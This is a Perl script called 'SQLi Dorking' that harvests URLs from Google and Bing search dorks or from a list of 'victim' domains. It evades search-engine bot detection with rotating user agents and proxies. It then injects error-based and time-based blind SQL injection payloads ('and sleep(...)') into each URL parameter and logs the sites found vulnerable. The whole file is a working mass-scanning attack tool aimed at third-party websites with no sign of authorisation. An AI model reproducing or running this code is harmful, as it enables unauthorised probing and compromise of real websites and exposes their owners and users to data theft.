#!/usr/bin/perl

#################################
#  SQLi Dorking				#
#	Autor: Crozz Cyborg			#
#								#
#  Copyright 2013 Crozz Cyborg  #
#################################

use strict;
$| = 1;
$SIG{'INT'} = \&Interrupt;

# Modulos/Librerias
use HTTP::Request;
use LWP::UserAgent;
use Getopt::Long;
use Benchmark;
use POSIX;
use threads;
use Time::HiRes "usleep";

# Variables
my @UserAgents = (
'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20130406 Firefox/23.0',
'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:22.0) Gecko/20130328 Firefox/22.0',
'Mozilla/5.0 (Windows NT 6.1; rv:22.0) Gecko/20130405 Firefox/22.0',
'Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))',
'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)',
'Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14',
'Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14',
'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14');

my ($Dork,$BingDork,$List,$NumPaginas,$FileLinks,$Proxy);
my ($proceso,@ProTime);

my $result = GetOptions(
				'gd=s'  => \$Dork,
				'bd=s'  => \$BingDork,
				'l=s'   => \$List,
				'p=s'   => \$NumPaginas,
				'f=s'   => \$FileLinks,
				'prx=s' => \$Proxy);

# INI Funciones

sub Uso(){
	die <<EOTXT;
\rUso: $0 [-d dork] -p <pages> [-l Links.txt]  [-f Logs.txt]
  -gd <Dork>
	  Google Dork
  -bd <Bing>
	  Bing Dork
  -l <Links.txt>
	  File with links to analyze
  -p <pages>
	  Number of pages to search
  -f <Logs.txt>
	  File where the logs will be saved

Example: $0 -d inurl:product.php?id= -p 3

More information type: perldoc $0
EOTXT
}

sub LinksByDork(){
	my @Links;
	my $Paginas = $Dork ? 0 : 1;
	my ($carga,$porcentaje) = ("",0);
	$proceso = 'dork';

	print "Dork: $Dork$BingDork\n";

	foreach(my $pag = 0;$pag <= $NumPaginas;$pag++){
		my ($HTML,$Link,@Data);

		printf("\r[%-50s] %3i%%",$carga,$porcentaje < 100 ? ceil($porcentaje) : floor($porcentaje));
		$porcentaje += (100/$NumPaginas);
		$carga = "=" x ($porcentaje < 100 ? ceil($porcentaje)/2 : floor($porcentaje)/2);
		my $time1 = new Benchmark;
		if($Dork){
			$HTML = &Navegar('http://www.google.com/search?q='.$Dork.'&start='.$Paginas,$Proxy);
		}
		elsif($BingDork){
			$HTML = &Navegar('http://www.bing.com/search?q='.$BingDork.'&first='.$Paginas,$Proxy);
		}
		my $time2 = new Benchmark;
		push(@ProTime,${timediff($time2,$time1)}[0]);

		if($HTML =~ m/Our systems have detected unusual traffic from your computer/i){
			$HTML =~ /IP address\: (\S+)\<br/i;
			print "\rDetectado trafico \"inusual\" de la IP $1\ncambiala para continuar [(C)ambiar a Bing/(Q)uitar/Continuar[Enter]] ";
			chomp(my $CQ = <STDIN>);
			if($CQ =~ /q/i){
				if($#Links > 0){
					@Links = &EliminarRep(@Links);
					return @Links
				}else{exit}
			}
			elsif($CQ =~ /c/i){
				$BingDork = $Dork;
				$Dork = 0;
				$Paginas += 1;
				$HTML = &Navegar('http://www.bing.com/search?q='.$BingDork.'&first='.$Paginas,$Proxy);
			}
			else{
				print "Continuando...\n";
				$pag--;
				next
			}
		}

		if($Dork){
			@Data = $HTML =~ m/href="\/url\?q=([-.:%?=&\/\w]+)\&amp;sa=U&amp;/gi;
		}
		elsif($BingDork){
			@Data = $HTML =~ /<h3><a href="([-.:%?=&\/\w]+)"/mgi;
		}

		foreach $Link(@Data){
			if($Link !~ m/google.com/i && $Link !~ m/googleusercontent.com/i && $Link !~ m/msn.com/i && ($Link =~ m/\%3[fF]\w+%3[dD]\w+/ || $Link =~ /\?\w+=\w+/)){
				$Link =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;
				$Link =~ s/https:\/\//http:\/\//g;

				push(@Links,$Link);
			}
		}
		$Paginas += 10;
	}

	print "\n\n";

	@Links = &EliminarRep(@Links);

	return @Links
}

sub LinksByList(){
	my @Links;
	$NumPaginas = 15;

	open(LIST,"$List");

	while(<LIST>){
		chomp;
		$BingDork = "site:$_";
		push(@Links,LinksByDork());
	}

	close(LIST);

	return @Links
}

sub Navegar(){
	my ($URL,$UseProxy) = @_;

	my ($UA,$Req,$Resp,$Contenido);

	$UA = LWP::UserAgent->new;
	$UA->agent($UserAgents[int(rand($#UserAgents+1))]);
	$UA->timeout(10);

	$URL =~ /^http\:\/\/([\w\.]+)\/*/;
	$UA->default_header('Host' => $1);
	$UA->default_header('Accept' => 'text/html');
	$UA->default_header('Accept-Language' => 'en-US,en;q=0.5');
	$UA->default_header('DNT' => '1');
	$UA->default_header('Connection' => 'close');

	$UA->proxy('http' => "http://$UseProxy") if $UseProxy;

	$Req = HTTP::Request->new(GET => $URL);
	$Resp = $UA->request($Req);
	return 0 unless($Resp->is_success);
	$Contenido = $Resp->content();
	return $Contenido
}

sub SQL(){
	my $Link = shift;

	my @Edit = split('\?',$Link); # Separate variable url
	my @Variables = split('&',$Edit[1]); # Separate peer variable = value

	my %Vars = map {split('=',$_)} @Variables; # Stores variable = value in the hash %Vars

	my $LinkMod;
	my @HTML = (undef) x 3;

	foreach my $Var(keys %Vars){
		$LinkMod = &ModLink($Edit[0],@Variables,$Var," '"); # Link is modified to inject the code 'in the variable $Var
		my $time1 = new Benchmark;
		unless($HTML[0] = &Navegar($LinkMod)){
			return 0;
		}
		my $time2 = new Benchmark;
		my $time3 = ${timediff($time2,$time1)}[0];  #push(@ProTime,${timediff($time2,$time1)}[0]);

		if($HTML[0] =~ m/You have an error in your SQL syntax/i){
			my @Ret = ($Link,$Var,"'",$ProTime[$#ProTime]);
			return \@Ret;
		}
		elsif($HTML[0] =~ m/supplied argument is not a valid MySQL/i){
			my @Ret = ($Link,$Var,"'",$ProTime[$#ProTime]);
			return \@Ret;
		}

		my ($tmp,$aumento);
		$tmp += $_ foreach(@ProTime);
		$tmp = int($tmp/($#ProTime+1));
		$aumento = $time3 >= ($tmp+3) ? 10 : 5;

		foreach(("' and sleep(".($time3+$aumento).") and '1' = '1"," and sleep(".($time3+$aumento).") and 1 = 1")){
			$LinkMod = &ModLink($Edit[0],@Variables,$Var,$_);

			my $time1 = new Benchmark;
			unless($HTML[0] = &Navegar($LinkMod)){
				next;
			}
			my $time2 = new Benchmark;
			my $timedif = timediff($time2,$time1);

			if($$timedif[0] >= ($time3+$aumento)){
				my @Ret = ($Link,$Var,$_,$$timedif[0]);
				return \@Ret;
			}
		}
	}
	return 0
}

sub ModLink(){
	my $Host = shift;
	my @Variables = shift;
	my $Var = shift;
	my $Code = shift;

	my %Vars = map {split('=',$_)} @Variables;

	my $LinkMod = $Host.'?';

	foreach (keys %Vars){
		if($Var eq $_){$LinkMod .= "$_=".$Vars{$_}." $Code&";}
		else{$LinkMod .= "$_=".$Vars{$_}."&";}
	}
	chop($LinkMod);
	return $LinkMod;
}

sub EliminarRep(){
	my @Links = @_;
	my @HP1;
	my @HP2;

	for(my $i = 0;$i <= $#Links;$i++){
		@HP1 = split('\?',$Links[$i]);
		for(my $x = $i;$x <= $#Links;$x++){
			@HP2 = split('\?',$Links[$x]);
			if($i != $x && $HP1[0] eq $HP2[0]){
				splice(@Links,$x,1);
				$x-- if $x != 0;
			}
		}
	}

	return @Links;
}

sub Logs(){
	if(open(LOGS,">>${$_[0]}")){
		print LOGS "$_[1]\n";
		close(LOGS);
	}
	else{
		print "Can not write to file '${$_[0]}' $!";
		print "Specify another file: ";
		chomp(${$_[0]} = <STDIN>);
	}
}

sub Interrupt(){
	print "\n\n1) Change Proxy\n2) Change Dork\n3) Leave\n\n\$> ";
	chomp(my $resp = <STDIN>);

	if($resp == 1){print "New proxy: ";chomp($Proxy = <STDIN>)}
	elsif($resp == 2){print "New dork: ";chomp($Dork = <STDIN>)}
	elsif($resp == 3){print "Finishing\n";exit}
	else{print "Option invalid\n";}
}

# End Funciones

sub main(){
	my @Links;

	my @LinkSQLi;
	my @t = (4,8,10);

	my @c = ("\e[1;32m","\e[0;32m");
	my $nc = 0;

	print "Getting Links...";
	if($Dork){
		Uso() unless $NumPaginas;
		if($BingDork){
			print "\rYou can only use a search engine!\n";
			Uso();
		}
		print "\n";push(@Links,LinksByDork());
	}
	elsif($BingDork){
		Uso() unless $NumPaginas;
		if($Dork){
			print "\rYou can only use a search engine!\n";
			Uso();
		}
		print "\n";push(@Links,LinksByDork());
	}
	elsif($List){
		print "\n";push(@Links,LinksByList());
	}
	else{
		Uso();
	}

	print "Scanning ".($#Links+1)." links...\n\n" if $#Links > 0;

	foreach(@Links){
		my $thr1 = threads->create(\&SQL,$_);

		while($thr1->is_running()){
			for(("/","-","\\","|")){
				print $_;
				usleep(80_000);
				print "\b";
			}
		}

		my $Datos = $thr1->join();

		if($Datos){
			foreach(0..2){
				$t[$_] = length($$Datos[$_]) if($t[$_] < length($$Datos[$_]));
			}
			printf("Link: %s Var: %s Payload: %s Time: %s\n",$$Datos[0],$$Datos[1],$$Datos[2],$$Datos[3]);
			&Logs(\$FileLinks,"Link: $$Datos[0] Var: $$Datos[1] Payload: $$Datos[2]") if $FileLinks;
			push(@LinkSQLi,$Datos);
		}
	}

	if(@LinkSQLi and $^O eq "linux"){
		printf("\n" x 5);
		printf("+%s+%s+%s+\n","-" x ($t[0]),"-" x ($t[1]),"-" x ($t[2]));
		printf("|\e[0;33mLink%s\e[0m|\e[0;33mVar%s\e[0m|\e[0;33mPayload%s\e[0m|\n"," " x ($t[0]-4)," " x ($t[1]-3)," " x ($t[2]-7));
		printf("+%s+%s+%s+\n","-" x ($t[0]),"-" x ($t[1]),"-" x ($t[2]));
		foreach my $l(@LinkSQLi){
			printf("|$c[$nc % 2]%-${t[0]}s\e[0m|$c[$nc % 2]%-${t[1]}s\e[0m|$c[$nc % 2]%-${t[2]}s\e[0m|\n",$$l[0],$$l[1],$$l[2]);
			$nc++;
		}
		printf("+%s+%s+%s+\n","-" x ($t[0]),"-" x ($t[1]),"-" x ($t[2]));
		system("notify-send \"SQLi Dorking\" \"Scanning completed ".($#LinkSQLi+1)." vulnerable\" -t 10000");
	}
	elsif(@LinkSQLi and $^O eq "MSWin32"){
		printf("\n" x 5);
		printf("+%s+\n","-" x ($t[0]));
		printf("|Link%s|\n"," " x ($t[0]-4));
		printf("+%s+\n","-" x ($t[0]));
		foreach my $l(@LinkSQLi){
			printf("|%-${t[0]}s|\n",$$l[0]);
		}
		printf("+%s+\n","-" x ($t[0]));
	}
	else{
		print "There are no pages vulnerable\n";
		system("msgbox * \"Scanning completed ".($#LinkSQLi+1)." vulnerable\"");
	}

}

main();

__END__

=head1 Nombre

SQLi Dorking

=head1 Version

Version: 1.1 Beta

=head1 Author

Crozz Cyborg

=head1 Description

Find pages vulnerable to SQL (use google)

=head1 Use

sqliDorking.pl [-d/-bd <dork>] -p <pages> [-l Links.txt]  [-f Logs.txt]

=head2 Options

  -gd <Dork>
	  Google Dork
  -bd <Bing>
	  Bing Dork
  -l <Links.txt>
	  File with links to analyze
  -p <pages>
	  Number of pages to search
  -f <Logs.txt>
	  File where the logs will be saved

=head2 Examples of use

sqliDorking.pl -gd inurl:product.php?id= -p 3 -f VulneSQL.txt

sqliDorking.pl -l links.txt -f VulneSQL.txt

sqliDorking.pl -bd inurl:product.php?id= -p 3

sqliDorking.pl -l links.txt

=head2 File Links.txt

Links.txt file can have any name, in format must have one domain name per line, eg domain: victim.com
